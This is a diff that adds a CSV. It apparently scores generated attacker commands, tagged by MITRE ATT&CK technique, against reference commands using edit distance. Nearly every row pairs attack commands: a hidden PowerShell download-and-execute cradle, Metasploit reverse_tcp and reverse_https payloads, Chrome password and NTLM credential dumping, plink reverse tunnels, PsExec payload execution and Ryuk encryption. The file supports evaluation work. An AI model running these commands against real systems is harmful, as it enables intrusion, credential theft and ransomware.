@@ -1,0 +1,40 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_adfind_TA0007_T1082.txt,adfind,adfind -sc syscrit,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.424,True
+command_adfind_TA0007_T1082.txt,adfind,adfind -sc syscritl,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.418,True
+command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.469,True
+command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump:csv,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.471,True
+command_adfind_TA0007_T1082.txt,adfind,adfind -sc schemadmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.441,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -OutputPath <obfuscated_file_path> -InputFile <original_file_path>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.369,True
+command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""whoami; ipconfig; systeminfo""",`meterpreter > powershell_execute Get-NetComputer`,0.301,True
+command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""New-Object System.Net.WebClient).DownloadFile('http://<url>/<file>', '<local_file>')""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",0.304,True
+command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://<url>/<script>'))""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",0.301,True
+command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""Start-Process -FilePath '<file_path>' -ArgumentList '<arguments>'""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",0.276,True
+command_metasploit_TA0002_T1203.txt,metasploit,use exploit/windows/misc/client_execution,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```",0.379,True
+command_metasploit_TA0002_T1203.txt,metasploit,set RHOST <target_machine_IP>,`meterpreter > migrate -N mstsc.exe `,0.273,True
+command_metasploit_TA0002_T1203.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.588,True
+command_metasploit_TA0002_T1203.txt,metasploit,exploit,`meterpreter > load powershell`,0.211,True
+command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -u <user_name> -p <password> -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.44,True
+command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -c \\\\remote_system -n <timeout_seconds> -p <password> -v," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.394,True
+command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -l -u <user_name> -w <remote_directory>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.337,True
+command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -h -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.322,True
+command_plink_TA0008_T1021.txt,plink,plink.exe -no-antispoof -R 3389:localhost:3389 <victim_machine_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.455,True
+command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -u <username> -p <password> -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.357,True
+command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -s -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.229,True
+command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -h -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.229,True
+command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""bitsadmin /transfer getfile /download /file C:\path\to\target_file.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.293,True
+command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -l -n 30 -u <attacker_username> -p <attacker_password> powershell -ExecutionPolicy Bypass -File C:\path\to\powershell_script.ps1,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.271,True
+command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -h -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""copy C:\path\to\target_file.exe %appdata%\Microsoft\Windows\Downloaded Program Files""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.336,True
+command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,0.417,True
+command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe -e,`ryuk.exe --encrypt --process-name notepad.exe`,0.379,True
+command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce.exe /dump /ntlm,"```sh
+wce.exe -w
+```",0.41,True
